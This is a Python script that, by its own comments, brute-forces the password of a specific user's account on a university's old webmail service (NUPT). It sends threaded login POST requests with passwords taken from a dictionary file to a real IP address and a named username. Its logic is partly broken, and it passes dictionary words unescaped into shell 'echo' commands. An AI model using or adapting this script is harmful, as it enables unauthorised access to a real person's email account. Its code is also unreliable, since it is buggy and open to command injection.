#A script to Brute-force cracking password of specific user of NUPT's old E-Mail Account
#//It semms useless unless you want to Brute-force the E-mail Account of fukun
#coding=utf-8
import urllib,httplib
from threading import *
import time
from os import system
class B(Thread):
	def __init__(self,a,num):
		Thread.__init__(self)
		self.n=num
		self.start()
	def run(self):
		for i in range(99999):
			try:
				conn = httplib.HTTPConnection("202.119.230.11:80") #建立http连接，记得地址不要加''''http://''''且要加上port；
				params ="username=chenyl&domain=njupt.edu.cn&password="+a.readline().strip('\r\n')
				headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
				conn.request("POST","http://202.119.230.11/wpx/pguser/do/portal/login.jsp", params, headers)
				response = conn.getresponse()
				if not i%1000:
					print(i)
					print(a.readline())
				if not response=='200':
					system("echo "+a[num*100000+i].strip('\r\n')+" >>/result.txt")
			except :
				time.sleep(10)
			conn.close()
a=open('/dic.txt','r')
for i in range(1248):
	system("echo "+str(i)+" >>/progress.txt")
	time.sleep(10)
	m=B(a,i)
a.close()
